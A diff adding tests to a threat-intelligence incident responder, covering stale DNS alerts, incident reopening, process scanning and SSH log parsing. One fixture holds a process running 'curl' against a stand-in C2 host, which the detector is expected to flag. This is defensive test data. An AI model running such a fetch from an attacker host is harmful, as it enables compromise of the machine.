@@ -228,3 +228,58 @@ def test_list_incidents_view(agent):  # noqa: F811
     resp = asyncio.run(agent.handle_admin({"op": "list_incidents", "params": {}, "token": "admin-token-for-tests"}))
     [inc] = resp["data"]
     assert inc["open"] is True and inc["alert_count"] == 1 and "keys" not in inc
+
+
+# --- stale observations (what the user saw: scans re-reporting an old lookup) ---------
+
+
+def test_old_observation_rescanned_after_handling_is_ignored(agent):  # noqa: F811
+    eng = agent.detector
+    t_lookup = time.time() - 5
+    rep = {"dns": {"malicious": [{"domain": "c2.lab.test", "lookups": 1, "answers": [], "observed_at": t_lookup,
+                                  "ioc_matches": [{"source": "local"}]}]}}
+    [first] = eng.process_event(("report", rep))
+    agent.config.autonomy = True
+    agent.autonomy.resolve(first, "execute", "Lab C2 domain confirmed, sinkhole it.")
+    for _ in range(3):                                   # periodic scans still remember the old lookup
+        assert eng.process_event(("report", rep)) == []
+    inc = agent.db.get_incident(agent.db.get_alert(first)["incident_id"])
+    assert inc["blocked_attempts"] == 0 and inc["alert_count"] == 1 and inc["severity"] == "high"
+    assert agent.db.get_alert(first)["occurrences"] == 1
+    rep["dns"]["malicious"][0]["observed_at"] = time.time() + 1   # a genuinely new lookup later
+    [again] = eng.process_event(("report", rep))
+    assert agent.db.get_alert(again)["incident_event"] == "reopened"
+
+
+def test_dns_repeat_is_never_called_persisting(agent):  # noqa: F811
+    eng = agent.detector
+    [first] = eng.process_event(("report", _dns_report()))
+    for a in agent.db.get_alert(first)["action_ids"]:
+        agent.manager.approve(a, "analyst:alice")
+        agent.manager.transition(a, "executed", "responder")
+    [again] = eng.process_event(("report", _dns_report()))
+    assert agent.db.get_alert(again)["incident_event"] == "reopened"     # not "persisting"
+
+
+def test_lookup_tools_are_not_malicious_processes(agent, monkeypatch):  # noqa: F811
+    import psutil
+    from types import SimpleNamespace as NS
+
+    procs = [NS(info={"pid": 501, "name": "getent", "cmdline": ["getent", "hosts", "c2.lab.test"],
+                      "username": "ahmed", "create_time": 1.0}),
+             NS(info={"pid": 502, "name": "curl", "cmdline": ["curl", "http://c2.lab.test/x"],
+                      "username": "www-data", "create_time": 1.0})]
+    monkeypatch.setattr(psutil, "process_iter", lambda attrs=None: procs)
+    hits = agent.scanner.scan_processes()["malicious"]
+    assert [h["process"] for h in hits] == ["curl"]                  # the lookup tool is not flagged
+
+
+def test_ssh_log_timestamps_are_parsed():
+    from mcp_threatintel.responder.scanner import parse_auth_lines
+
+    out = parse_auth_lines([
+        "2026-11-10T20:22:29+0000 devsecops sshd[1]: Failed password for root from 192.168.56.66 port 1 ssh2",
+        "2026-11-10T20:22:31+00:00 devsecops sshd[1]: Failed password for root from 192.168.56.66 port 2 ssh2",
+    ])
+    assert out["192.168.56.66"]["failures"] == 2
+    assert out["192.168.56.66"]["last"] == 1794342151.0               # 2026-11-10T20:22:31Z
